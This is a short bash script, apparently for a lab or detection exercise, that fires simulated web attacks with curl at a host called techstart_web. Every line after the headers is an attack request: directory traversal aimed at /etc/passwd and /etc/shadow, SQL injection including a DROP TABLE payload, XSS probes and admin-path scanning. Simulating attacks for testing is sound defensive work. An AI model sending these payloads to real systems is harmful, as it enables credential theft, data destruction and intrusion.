#!/bin/bash
# web_attacks.sh - Script to simulate common web attacks

echo "[+] Starting web attack simulation"

echo "[+] Directory traversal attempts"
curl "http://techstart_web/../../../../../../../etc/passwd"
curl "http://techstart_web/../../etc/shadow"

echo "[+] SQL injection attempts"
curl "http://techstart_web/login.php?user=admin'%20OR%20'1'='1&password=anything"
curl "http://techstart_web/search.php?q='; DROP TABLE users; --"

echo "[+] XSS attack attempts"
curl "http://techstart_web/search.php?q=<script>alert('XSS')</script>"
curl "http://techstart_web/comment.php?text=<img%20src='x'%20onerror='alert(1)'>"

echo "[+] Admin access attempts"
curl "http://techstart_web/admin/"
curl "http://techstart_web/administrator/"
curl "http://techstart_web/wp-admin/"

echo "[+] Web attacks complete"